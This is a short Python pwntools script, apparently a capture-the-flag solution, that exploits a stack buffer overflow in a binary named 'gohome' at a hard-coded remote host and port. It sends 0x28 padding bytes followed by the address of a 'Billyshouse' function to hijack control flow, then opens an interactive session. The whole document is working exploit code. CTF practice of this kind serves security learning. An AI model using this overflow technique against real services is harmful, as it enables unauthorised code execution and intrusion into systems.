#!/usr/bin/env python3
from pwn import *

HOST = "140.110.112.77"
PORT = "6126"
FILENAME = "gohome"

host = args.HOST or HOST
port = int(args.PORT or PORT)

exe = ELF(FILENAME)

gdbscript='''
break main
c
'''

def local():
    if args.GDB:
        context.terminal = ['tmux','splitw','-h']
        context(log_level='debug')
        return gdb.debug(exe.path, gdbscript)
    else:
        return process([exe.path])

def remote():
    io = connect(host, port)
    return io

start = local if args.LOCAL else remote

#==================================================
# Start pwn
#==================================================
io = start()

io.recvuntil("house ?")

payload = b'A'*0x28 + p64(exe.symbols['Billyshouse']+0x4)

io.sendline(payload)

io.interactive()